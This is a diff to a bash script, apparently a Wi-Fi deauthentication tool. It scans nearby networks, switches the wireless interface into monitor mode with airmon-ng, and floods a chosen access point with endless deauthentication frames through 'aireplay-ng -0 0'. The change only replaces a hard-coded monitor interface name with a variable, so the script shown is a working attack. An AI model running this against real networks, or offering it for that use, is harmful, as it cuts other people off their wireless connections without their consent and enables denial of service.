@@ -9,7 +9,7 @@ Email: YAKM0@pm.me        | Drink all the beer,
 Twitter: @Y4KM0           | hack all the things. -dualcore
 =============================================================
 "
-
+mon='mon'
 sleep 5
 clear
 nmcli dev wifi | awk '$2 != "--"' |awk '{print NR,$1,$2,$4}'
@@ -34,10 +34,10 @@ while true; do
 done
 sudo airmon-ng start $interface > /dev/null 2>&1
 clear
-sudo timeout 2s airodump-ng -d $Target -c $Chan wlan0mon > /dev/null 2>&1
-sudo aireplay-ng -0 0 -a $Target wlan0mon --ignore-negative-one
+sudo timeout 2s airodump-ng -d $Target -c $Chan $interface$mon > /dev/null 2>&1
+sudo aireplay-ng -0 0 -a $Target $interface$mon --ignore-negative-one
 sleep 3
 clear
 echo "Returning to managed mode"
 sleep 2
-sudo airmon-ng stop wlan0mon > /dev/null 2>&1
+sudo airmon-ng stop $interface$mon > /dev/null 2>&1
